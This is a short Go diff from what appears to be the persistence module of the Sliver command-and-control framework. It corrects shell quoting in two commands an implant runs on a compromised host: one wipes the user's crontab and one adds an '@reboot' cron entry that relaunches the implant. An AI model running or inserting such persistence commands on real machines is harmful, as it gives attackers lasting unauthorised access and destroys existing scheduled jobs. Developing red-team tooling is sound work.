@@ -228,7 +228,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			} else {
 				resp, err := rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 					Path:    "/bin/sh",
-					Args:    []string{"-c", "\"crontab -r\""},
+					Args:    []string{"-c", "crontab -r"},
 					Output:  false,
 					Request: ActiveSession.Request(ctx),
 				})
@@ -417,7 +417,7 @@ func persist(ctx *grumble.Context, rpc rpcpb.SliverRPCClient) {
 			// User persistence (crontab)
 			resp, err = rpc.Execute(context.Background(), &sliverpb.ExecuteReq{
 				Path:    "/bin/sh",
-				Args:    []string{"-c", fmt.Sprintf("\"echo \\\"@reboot %s\\\" | crontab -\"", path)},
+				Args:    []string{"-c", fmt.Sprintf("echo \"@reboot %s\" | crontab -", path)},
 				Output:  false,
 				Request: ActiveSession.Request(ctx),
 			})
